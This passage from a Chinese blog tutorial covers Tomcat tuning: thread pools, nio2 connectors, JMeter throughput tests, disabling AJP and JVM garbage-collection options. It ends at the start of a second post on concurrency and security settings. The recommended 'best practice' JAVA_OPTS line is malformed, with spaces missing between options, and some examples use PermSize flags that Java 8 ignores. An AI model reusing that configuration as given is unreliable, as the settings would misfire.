<h4 id="执行器（线程池）"><a href="#执行器（线程池）" class="headerlink" title="执行器（线程池）"></a>执行器（线程池）</h4><p>在tomcat中每一个用户请求都是一个线程，所以可以使用线程池提高性能。</p>
<p>修改server.xml文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--将注释打开--&gt;</span><br><span class="line">&lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">        maxThreads=&quot;500&quot; minSpareThreads=&quot;50&quot; prestartminSpareThreads=&quot;true&quot; maxQueueSize=&quot;100&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">参数说明：</span><br><span class="line">maxThreads：最大并发数，默认设置 200，一般建议在 500 ~ 1000，根据硬件设施和业务来判断</span><br><span class="line">minSpareThreads：Tomcat 初始化时创建的线程数，默认设置 25</span><br><span class="line">prestartminSpareThreads： 在 Tomcat 初始化的时候就初始化 minSpareThreads 的参数值，如果不等于 true，minSpareThreads 的值就没啥效果了</span><br><span class="line">maxQueueSize，最大的等待队列数，超过则拒绝请求</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--在Connector中设置executor属性指向上面的执行器--&gt;</span><br><span class="line">&lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>保存退出，重启tomcat，查看效果。</p>
<p><img src="/articles/a315956e/7.png" alt></p>
<p>在页面中显示最大线程数为-1，这个是正常的，仅仅是显示的问题，实际使用的是指定的值。如果配置了一个Executor，则该属性的任何值将被正确记录，但是它将被显示为-1</p>
<h4 id="运行模式"><a href="#运行模式" class="headerlink" title="运行模式"></a>运行模式</h4><p>tomcat的运行模式有3种：</p>
<p><strong>bio</strong><br>性能非常低下，没有经过任何优化处理和支持。</p>
<p><strong>nio</strong><br>nio(new I/O)，是Java SE 1.4及后续版本提供的一种新的I/O操作方式(即java.nio包及其子包)。Java nio是一个基于缓冲区、并能提供非阻塞I/O操作的Java API，因此nio也被看成是non-blocking I/O的缩写。它拥有比传统I/O操作(bio)更好的并发运行性能。Tomcat8默认使用nio运行模式。</p>
<p><strong>apr</strong><br>安装起来最困难，但是从操作系统级别来解决异步的IO问题，大幅度的提高性能。</p>
<p>对于每种协议，Tomcat都提供了对应的I/O方式的实现，而且Tomcat官方还提供了在每种协议下每种I/O实现方案的差异， HTTP协议下的处理方式如下表，详情可查看<a href="https://tomcat.apache.org/tomcat-8.5-doc/config/http.html" target="_blank" rel="noopener">Tomcat官网说明</a></p>
<p><img src="/articles/a315956e/8.png" alt><br>推荐使用nio，在tomcat8中有最新的nio2，速度更快，建议使用nio2</p>
<p>设置nio2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Connector executor=&quot;tomcatThreadPool&quot;  port=&quot;8080&quot; protocol=&quot;org.apache.coyote.http11.Http11Nio2Protocol&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到已经设置为nio2了。</p>
<p>部署测试用的web项目<br>为了方便测试性能，我们将部署一个java web项目，这个项目本身和本博客没有什么关系，仅仅用于测试。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意：这里在测试时，我们使用一个新的tomcat，进行测试，后面再对其进行优化调整，再测试。</span><br></pre></td></tr></table></figure>

<h2 id="查看服务器信息"><a href="#查看服务器信息" class="headerlink" title="查看服务器信息"></a>查看服务器信息</h2><p>说明一下我的测试服务器配置，不同的服务器配置对Tomcat的性能会有所影响。</p>
<p><img src="/articles/a315956e/9.png" alt></p>
<p>CentOS7服务器环境信息查看命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看Linux版本：cat /etc/centos-release</span><br><span class="line"></span><br><span class="line">查看CPU个数</span><br><span class="line">查看逻辑cpu个数：cat /proc/cpuinfo | grep “processor” | wc -l</span><br><span class="line">查看物理cpu个数：cat /proc/cpuinfo | grep “physical id” | sort | uniq | wc -l</span><br><span class="line">查看每个物理cpu的核数cores：cat /proc/cpuinfo | grep “cpu cores”</span><br><span class="line">如果所有物理cpu的cores个数加起来小于逻辑cpu的个数，则该cpu使用了超线程技术。查看每个物理cpu中逻辑cpu的个数：cat /proc/cpuinfo | grep “siblings”</span><br><span class="line"></span><br><span class="line">查看内存使用情况</span><br><span class="line">查看内存占用情况：free -m</span><br><span class="line"></span><br><span class="line">参数说明</span><br><span class="line">Mem：内存的使用情况总览表。</span><br><span class="line">total：机器总的物理内存 单位为：M</span><br><span class="line">used：用掉的内存。</span><br><span class="line">free：空闲的物理内存。</span><br></pre></td></tr></table></figure>

<h2 id="部署web应用"><a href="#部署web应用" class="headerlink" title="部署web应用"></a>部署web应用</h2><p>上传war包到linux服务器，然后进行部署</p>
<p>我的web应用的名字叫tomcat-optimization，主要是提供了一个查询用户列表的接口，该接口会去阿里云数据库查询用户列表，没有任务业务逻辑的处理。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除tomcat的/webapps/ROOT目录的所有文件</span></span><br><span class="line"><span class="built_in">cd</span> /webapps/ROOT</span><br><span class="line">rm -rf *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传war包到tomcat的/webapps/ROOT，然后解压</span></span><br><span class="line">jar -xvf tomcat-optimization.war</span><br><span class="line">rm -rf tomcat-optimization.war</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入tomcat的/bin目录重启tomcat</span></span><br><span class="line"><span class="built_in">cd</span> /bin</span><br><span class="line">./shutdown.sh</span><br><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>

<p>访问接口地址： <a href="http://10.93.165.61:8080/user/listUser" target="_blank" rel="noopener">http://10.93.165.61:8080/user/listUser</a></p>
<h2 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h2><p>Apache JMeter是Apache组织开发的基于Java的压力测试工具。 我们借助于此工具进行测试，将测试出tomcat的吞吐量等信息。</p>
<p><a href="http://jmeter.apache.org/download_jmeter.cgi" target="_blank" rel="noopener">官网下载地址</a></p>
<p><img src="/articles/a315956e/10.png" alt></p>
<p>注意：这里需要先安装好jdk8及其以上版本的环境。</p>
<p>直接将下载好的zip压缩包进行解压, 进入bin目录，找到jmeter.bat文件，双机打开即可启动。</p>
<p><img src="/articles/a315956e/11.png" alt></p>
<p>启动后，JMeter主页面如下</p>
<p><img src="/articles/a315956e/12.png" alt></p>
<p>修改语言<br>默认的主题是黑色风格的主题并且语言是英语，这样不太方便使用，所以需要修改下语言。</p>
<p>设置语言为简体中文。</p>
<p><img src="/articles/a315956e/13.png" alt></p>
<p>创建接口的测试用例<br>测试接口之前需要调整Windows环境配置，不然会报如下错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JMeter java.net.BindException: Address already in use: connect</span><br></pre></td></tr></table></figure>

<p>出现原因：<br>TCP/IP连接数不够或TIME_WAIT中存在很多链接，导致吞吐量低。</p>
<p>解决方案：<br>从问题的原因分析，有两种解决方案，一是增加预留给TCP/IP服务的临时端口的数量，二是加快被占用端口的释放速度。</p>
<p>解决办法：<br>1、打开注册表：regedit<br>2、HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\ Services\TCPIP\Parameters<br>3、新建 DWORD值，name：TCPTimedWaitDelay，value：30（十进制） –&gt; 设置为30秒，默认是240秒<br>4、新建 DWORD值，name：MaxUserPort，value：65534（十进制） –&gt; 设置最大连接数65534<br>5、重启系统</p>
<p>第一步：设置测试计划的名称</p>
<p>第二步：添加线程组，使用线程模拟用户的并发</p>
<p><img src="/articles/a315956e/14.png" alt></p>
<p><img src="/articles/a315956e/15.png" alt></p>
<p>1000个线程，每个线程循环10次，也就是tomcat会接收到10000个请求。</p>
<p>第三步：添加http请求</p>
<p><img src="/articles/a315956e/16.png" alt></p>
<p>设置http请求</p>
<p><img src="/articles/a315956e/17.png" alt></p>
<p>第四步：添加请求监控</p>
<p><img src="/articles/a315956e/18.png" alt></p>
<p>启动与进行接口测试</p>
<p>查看测试报告<br>在聚合报告中，重点看吞吐量。</p>
<p><img src="/articles/a315956e/19.png" alt></p>
<p>调整Tomcat参数进行优化<br>通过上面测试可以看出，tomcat在不做任何调整时，吞吐量为697次/秒。这个吞吐量跟接口的业务逻辑关系很大，如果业务逻辑复杂，需要比较长时间计算的，可能吞吐量只有几十次/秒，我这里测试的时候没有添加任务业务逻辑，才会出现吞吐量为697次/秒的情况。这里的吞吐量最好是经过多次测试取平均值，因为单次测试具有一定的随机性</p>
<p>禁用AJP连接<br>修改conf下的server.xml文件，将AJP服务禁用掉即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- &lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; /&gt; --&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/a315956e/20.png" alt></p>
<p>这里经过9次测试，测试结果如下704 730 736 728 730 727 714 708 735 平均是723</p>
<p>可以看到，禁用AJP服务后，吞吐量会有所提升。</p>
<p>当然了，测试不一定准确，需要多测试几次才能看出是否有提升。</p>
<p>设置线程池<br>通过设置线程池，调整线程池相关的参数进行测试tomcat的性能。有关线程池更多更详细的配置参考Tomcat官网提供的配置详解</p>
<p>最大线程数为150，初始为4</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">        maxThreads=&quot;150&quot; minSpareThreads=&quot;4&quot; prestartminSpareThreads=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--在Connector中设置executor属性指向上面的执行器--&gt;</span><br><span class="line">&lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/a315956e/21.png" alt></p>
<p>经过9次测试，测试结果如下705 725 702 729 733 738 735 728 平均是724</p>
<p><strong>最大线程数为500，初始为50</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">        maxThreads=&quot;500&quot; minSpareThreads=&quot;50&quot; prestartminSpareThreads=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--在Connector中设置executor属性指向上面的执行器--&gt;</span><br><span class="line">&lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>测试结果：733 724 718 728 734 721 720 723 平均725。吞吐量为725次/秒，性能有所提升。</p>
<p><strong>最大线程数为1000，初始为200</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">        maxThreads=&quot;1000&quot; minSpareThreads=&quot;200&quot; prestartminSpareThreads=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--在Connector中设置executor属性指向上面的执行器--&gt;</span><br><span class="line">&lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>吞吐量为732，性能有所提升。测试结果 737 729 730 738 735 726 725 740 平均732</p>
<p><strong>最大线程数为5000，初始为1000</strong><br>是否是线程数最多，速度越快呢？ 我们来测试下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">        maxThreads=&quot;5000&quot; minSpareThreads=&quot;1000&quot; prestartminSpareThreads=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--在Connector中设置executor属性指向上面的执行器--&gt;</span><br><span class="line">&lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>测试结果 727 733 728 725 738 729 737 735 739 平均732</p>
<p>可以看到，虽然最大线程已经设置到5000，但是实际测试效果并不理想，并且平均的响应时间也边长了，所以单纯靠提升线程数量是不能一直得到性能提升的。</p>
<p><strong>设置最大等待队列数</strong><br>默认情况下，请求发送到tomcat，如果tomcat正忙，那么该请求会一直等待。这样虽然可以保证每个请求都能请求到，但是请求时间就会边长。</p>
<p>有些时候，我们也不一定要求请求一定等待，可以设置最大等待队列大小，如果超过就不等待了。这样虽然有些请求是失败的，但是请求时间会虽短。典型的应用：12306。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--最大等待数为100--&gt;</span><br><span class="line">&lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">        maxThreads=&quot;500&quot; minSpareThreads=&quot;100&quot; prestartminSpareThreads=&quot;true&quot; maxQueueSize=&quot;100&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--在Connector中设置executor属性指向上面的执行器--&gt;</span><br><span class="line">&lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/a315956e/22.png" alt></p>
<p>测试结果：</p>
<ul>
<li><p>平均响应时间：0.438秒，响应时间明显缩短</p>
</li>
<li><p>错误率：43.07%，错误率超过40%，也可以理解，最大线程为500，测试的并发为1000</p>
</li>
<li><p>吞吐量：1359次/秒，吞吐量明显提升</p>
<p>结论：响应时间、吞吐量这2个指标需要找到平衡才能达到更好的性能。</p>
</li>
</ul>
<p><strong>设置nio2的运行模式</strong><br>将最大线程设置为500进行测试：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">        maxThreads=&quot;500&quot; minSpareThreads=&quot;100&quot; prestartminSpareThreads=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 设置nio2 --&gt;</span><br><span class="line">&lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; protocol=&quot;org.apache.coyote.http11.Http11Nio2Protocol&quot;</span><br><span class="line">               connectionTimeout=&quot;20000&quot;</span><br><span class="line">               redirectPort=&quot;8443&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>从测试结果可以看到，平均响应时间有缩短，吞吐量有提升，可以得出结论：nio2的性能要高于nio。</p>
<p>参数说明与最佳实践<br>具体参数参考官网说明</p>
<p>执行器参数说明(加粗是重点)<br><img src="/articles/a315956e/23.png" alt><br>执行器最佳实践<br>此最佳配置仅供参考</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Executor name=&quot;tomcatThreadPool&quot; namePrefix=&quot;catalina-exec-&quot;</span><br><span class="line">        maxThreads=&quot;800&quot; minSpareThreads=&quot;100&quot; maxQueueSize=&quot;100&quot;                                 prestartminSpareThreads=&quot;true&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>连接器参数说明<br>可以看到除了这几个基本配置外并无特殊功能，所以我们需要对 Connector 进行扩展。</p>
<p>其中Connector 支持参数属性可以参考Tomcat官方网站，本文就只介绍些常用的。</p>
<p>通用属性(加粗是重点)<br><img src="/articles/a315956e/24.png" alt></p>
<p><img src="/articles/a315956e/25.png" alt></p>
<p><img src="/articles/a315956e/26.png" alt></p>
<p><strong>标准实现(加粗是重点)</strong><br>除了上面列出的常见的连接器属性，标准的HTTP连接器（BIO，NIO和APR/native）都支持以下属性。</p>
<p><img src="/articles/a315956e/27.png" alt></p>
<p><img src="/articles/a315956e/28.png" alt></p>
<p><img src="/articles/a315956e/29.png" alt></p>
<p><img src="/articles/a315956e/30.png" alt></p>
<p><strong>连接器最佳实践</strong><br>此最佳配置仅供参考</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Connector executor=&quot;tomcatThreadPool&quot; port=&quot;8080&quot; 						                            protocol=&quot;org.apache.coyote.http11.Http11Nio2Protocol&quot; </span><br><span class="line">           connectionTimeout=&quot;20000&quot; redirectPort=&quot;8443&quot; </span><br><span class="line">           enableLookups=&quot;false&quot; maxPostSize=&quot;10485760&quot; URIEncoding=&quot;UTF-8&quot; 	                    acceptCount=&quot;100&quot; acceptorThreadCount=&quot;2&quot; disableUploadTimeout=&quot;true&quot;                    maxConnections=&quot;10000&quot; SSLEnabled=&quot;false&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p><strong>调整JVM参数进行优化</strong><br>接下来，通过设置jvm参数进行优化，为了测试一致性，依然将最大线程数设置为500，启用nio2运行模式</p>
<p><strong>设置并行垃圾回收器</strong><br>在/bin/catalina.sh文件第一行添加如下参数，gc日志输出到/logs/gc.log</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#年轻代、老年代均使用并行收集器，初始堆内存64M，最大堆内存512M</span><br><span class="line">JAVA_OPTS=&quot;-XX:+UseParallelGC -XX:+UseParallelOldGC -Xms64m -Xmx512m -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintHeapAtGC -Xloggc:../logs/gc.log&quot;</span><br></pre></td></tr></table></figure>

<p>测试结果与默认的JVM参数结果接近。</p>
<p>查看gc日志文件<br>将gc.log文件上传到gceasy.io查看gc中是否存在问题。上传文件后需要等待一段时间，需要耐心等待。</p>
<p>问题一：<strong>系统所消耗的时间大于用户时间</strong></p>
<p>如果在报告中显示System Time greater than User Time，系统所消耗的时间大于用户时间，这反应出的服务器的性能存在瓶颈，调度CPU等资源所消耗的时间要长一些。</p>
<p>问题二：<strong>线程暂停时间有点长</strong></p>
<p>可以关键指标中可以看出，吞吐量表现不错，但是gc时，线程的暂停时间稍有点长。</p>
<p>问题三：<strong>GC总次数过多</strong></p>
<p><img src="/articles/a315956e/31.png" alt></p>
<p>通过GC的统计可以看出：</p>
<p>年轻代的gc有100次，次数有点多，说明年轻代设置的大小不合适，需要调整<br>FullGC有7次，说明堆内存的大小不合适，需要调整</p>
<p>问题四：<strong>年轻代内存不足导致GC</strong></p>
<p><img src="/articles/a315956e/32.png" alt></p>
<p>从GC原因的可以看出，年轻代大小设置不合理，导致了多次GC。</p>
<p>调整年轻代大小<br>调整jvm配置参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVA_OPTS=&quot;-XX:+UseParallelGC -XX:+UseParallelOldGC -Xms128m -Xmx1024m -XX:NewSize=64m -XX:MaxNewSize=256m -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintHeapAtGC -Xloggc:../logs/gc.log&quot;</span><br></pre></td></tr></table></figure>

<p>将初始堆大小设置为128m，最大为1024m，初始年轻代大小64m，年轻代最大256m</p>
<p>从测试结果来看，吞吐量以及响应时间均有提升。</p>
<p>查看gc日志</p>
<p><img src="/articles/a315956e/33.png" alt></p>
<p>可以看到GC次数要明显减少，说明调整是有效的。</p>
<p><img src="/articles/a315956e/34.png" alt></p>
<p>GC次数有所减少</p>
<p><img src="/articles/a315956e/35.png" alt></p>
<p>设置G1垃圾回收器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#设置了最大停顿时间100毫秒，初始堆内存128m，最大堆内存1024m</span><br><span class="line">JAVA_OPTS=&quot;-XX:+UseG1GC -XX:MaxGCPauseMillis=100 -Xms128m -Xmx1024m -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintHeapAtGC -Xloggc:../logs/gc.log&quot;</span><br></pre></td></tr></table></figure>

<p>测试结果: 可以看到，吞吐量有所提升，评价响应时间也有所缩短。</p>
<p>JVM配置最佳实践<br>此最佳配置仅供参考</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVA_OPTS=&quot;-Dfile.encoding=UTF-8-server -Xms1024m -Xmx2048m -XX:NewSize=512m -XX:MaxNewSize=1024m -XX:PermSize=256m -XX:MaxPermSize=256m -XX:MaxTenuringThreshold=10-XX:NewRatio=2 -XX:+DisableExplicitGC&quot;</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file.encoding 默认文件编码</span><br><span class="line">-Xmx1024m 设置JVM最大可用内存为1024MB</span><br><span class="line">-Xms1024m 设置JVM最小内存为1024m。此值可以设置与-Xmx相同，以避免每次垃圾回收完成后JVM重新分配内存。</span><br><span class="line">-XX:NewSize 设置年轻代大小</span><br><span class="line">-XX:MaxNewSize 设置最大的年轻代大小</span><br><span class="line">-XX:PermSize 设置永久代大小</span><br><span class="line">-XX:MaxPermSize 设置最大永久代大小</span><br><span class="line">-XX:NewRatio=4 设置年轻代（包括Eden和两个Survivor区）与终身代的比值（除去永久代）。设置为4，则年轻代与终身代所占比值为1：4，年轻代占整个堆栈的1/5</span><br><span class="line">-XX:MaxTenuringThreshold=0 设置垃圾最大年龄，默认为：15。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。</span><br><span class="line">-XX:+DisableExplicitGC 这个将会忽略手动调用GC的代码使得System.gc()的调用就会变成一个空调用，完全不会触发任何GC。</span><br></pre></td></tr></table></figure>

<p>总结<br>通过上述的测试，可以总结出，对tomcat性能优化就是需要不断的进行调整参数，然后测试结果，可能会调优也可能会调差，这时就需要借助于gc的可视化工具来看gc的情况。再帮我我们做出决策应该调整哪些参数。</p>
<p>再次重申本博客的目的不在于给出最佳配置，而是带领开发者，能够从实际情况出发，通过不断的调节tomcat和jvm参数，去发现吞吐量，平均响应时间和错误率等信息的变化，同时根据服务器的cpu和内存等信息，结合接口的业务逻辑，最好是测试使用率最高，并发最大，或者是最重要的接口(比如下单支付接口)，设置最优的tomcat和jvm配置参数。</p>
]]></content>
      <categories>
        <category>容器化</category>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat高并发和安全配置</title>
    <url>/articles/d5611253.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>现在Tomcat容器在企业中的应用还占据很高比例，如何对Tomcat优化配置，让其实现高并发的同时，安全也能兼顾呢。本篇就详细介绍Tomcat高并发和安全配置。</p>
<a id="more"></a>



<h2 id="变量配置"><a href="#变量配置" class="headerlink" title="变量配置"></a>变量配置</h2><p>设置 Tomcat 相关变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim bin/catalina.sh</span><br></pre></td></tr></table></figure>

<p>在配置文件的可编辑内容最上面（98 行开始），加上如下内容（具体参数根据你服务器情况自行修改）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVA_HOME=/usr/program/jdk1.8.0_72</span><br><span class="line">CATALINA_HOME=/usr/program/tomcat8</span><br><span class="line">CATALINA_OPTS=&quot;-server -Xms528m -Xmx528m -XX:PermSize=256m -XX:MaxPermSize=358m&quot;</span><br><span class="line">CATALINA_PID=$CATALINA_HOME/catalina.pid</span><br></pre></td></tr></table></figure>

<p>如果使用 shutdown.sh 还无法停止 tomcat，可以修改其配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim bin/shutdown.sh</span><br><span class="line">把最尾巴这一行：exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; stop &quot;$@&quot;</span><br><span class="line">改为：exec &quot;$PRGDIR&quot;/&quot;$EXECUTABLE&quot; stop 10 -force</span><br></pre></td></tr></table></figure>



<h2 id="JVM-优化"><a href="#JVM-优化" class="headerlink" title="JVM 优化"></a>JVM 优化</h2><p>Java 的内存模型分为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Young，年轻代（易被 GC）。Young 区被划分为三部分，Eden 区和两个大小严格相同的 Survivor 区，其中 Survivor 区间中，某一时刻只有其中一个是被使用的，另外一个留做垃圾收集时复制对象用，在 Young 区间变满的时候，minor GC 就会将存活的对象移到空闲的Survivor 区间中，根据 JVM 的策略，在经过几次垃圾收集后，任然存活于 Survivor 的对象将被移动到 Tenured 区间。</span><br><span class="line"></span><br><span class="line">Tenured，终身代。Tenured 区主要保存生命周期长的对象，一般是一些老的对象，当一些对象在 Young 复制转移一定的次数以后，对象就会被转移到 Tenured 区，一般如果系统中用了 application 级别的缓存，缓存中的对象往往会被转移到这一区间。</span><br><span class="line"></span><br><span class="line">Perm，永久代。主要保存 class,method,filed 对象，这部门的空间一般不会溢出，除非一次性加载了很多的类，不过在涉及到热部署的应用服务器的时候，有时候会遇到 java.lang.OutOfMemoryError : PermGen space 的错误，造成这个错误的很大原因就有可能是每次都重新部署，但是重新部署后，类的 class 没有被卸载掉，这样就造成了大量的 class 对象保存在了 perm 中，这种情况下，一般重新启动应用服务器可以解决问题。</span><br></pre></td></tr></table></figure>

<p>Linux 修改 bin/catalina.sh 文件，把下面信息添加到文件第一行。Windows 和 Linux 有点不一样的地方在于，在 Linux 下，下面的的参数值是被引号包围的，而 Windows 不需要引号包围。</p>
<p>如果服务器只运行一个 Tomcat<br>机子内存如果是 8G，一般 PermSize 配置是主要保证系统能稳定起来就行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVA_OPTS=&quot;-Dfile.encoding=UTF-8 -server -Xms6144m -Xmx6144m -XX:NewSize=1024m -XX:MaxNewSize=2048m -XX:PermSize=512m -XX:MaxPermSize=512m -XX:MaxTenuringThreshold=10 -XX:NewRatio=2 -XX:+DisableExplicitGC&quot;</span><br></pre></td></tr></table></figure>

<p>机子内存如果是 16G，一般 PermSize 配置是主要保证系统能稳定起来就行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVA_OPTS=&quot;-Dfile.encoding=UTF-8 -server -Xms13312m -Xmx13312m -XX:NewSize=3072m -XX:MaxNewSize=4096m -XX:PermSize=512m -XX:MaxPermSize=512m -XX:MaxTenuringThreshold=10 -XX:NewRatio=2 -XX:+DisableExplicitGC&quot;</span><br></pre></td></tr></table></figure>

<p>机子内存如果是 32G，一般 PermSize 配置是主要保证系统能稳定起来就行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JAVA_OPTS=&quot;-Dfile.encoding=UTF-8 -server -Xms29696m -Xmx29696m -XX:NewSize=6144m -XX:MaxNewSize=9216m -XX:PermSize=1024m -XX:MaxPermSize=1024m -XX:MaxTenuringThreshold=10 -XX:NewRatio=2 -XX:+DisableExplicitGC&quot;</span><br></pre></td></tr></table></figure>

<p>如果是开发机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms550m -Xmx1250m -XX:PermSize=550m -XX:MaxPermSize=1250m</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Dfile.encoding：默认文件编码</span><br><span class="line">-server：表示这是应用于服务器的配置，JVM 内部会有特殊处理的</span><br><span class="line">-Xmx1024m：设置JVM最大可用内存为1024MB</span><br><span class="line">-Xms1024m：设置JVM最小内存为1024m。此值可以设置与-Xmx相同，以避免每次垃圾回收完成后JVM重新分配内存。</span><br><span class="line">-XX:NewSize：设置年轻代大小</span><br><span class="line">-XX:MaxNewSize：设置最大的年轻代大小</span><br><span class="line">-XX:PermSize：设置永久代大小</span><br><span class="line">-XX:MaxPermSize：设置最大永久代大小</span><br><span class="line">-XX:NewRatio=4：设置年轻代（包括 Eden 和两个 Survivor 区）与终身代的比值（除去永久代）。设置为 4，则年轻代与终身代所占比值为 1：4，年轻代占整个堆栈的 1/5</span><br><span class="line">-XX:MaxTenuringThreshold=10：设置垃圾最大年龄，默认为：15。如果设置为 0 的话，则年轻代对象不经过 Survivor 区，直接进入年老代。对于年老代比较多的应用，可以提高效率。                             如果将此值设置为一个较大值，则年轻代对象会在 Survivor 区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。</span><br><span class="line">-XX:+DisableExplicitGC：这个将会忽略手动调用 GC 的代码使得 System.gc() 的调用就会变成一个空调用，完全不会触发任何 GC</span><br></pre></td></tr></table></figure>

